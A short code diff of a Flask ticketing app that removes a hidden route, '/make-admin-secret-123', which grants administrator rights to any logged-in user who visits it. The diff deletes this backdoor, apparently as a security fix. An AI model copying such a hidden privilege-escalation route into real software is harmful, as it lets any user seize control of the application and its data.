@@ -381,11 +381,3 @@ def upload_attachment(ticket_id):
         flash('File type not allowed.', 'error')
     
     return redirect(url_for('main.ticket_detail', ticket_id=ticket_id))
-
-@main.route('/make-admin-secret-123')
-@login_required
-def make_admin_secret():
-    current_user.is_admin = True
-    db.session.commit()
-    flash('You are now an admin!', 'success')
-    return redirect(url_for('main.dashboard'))
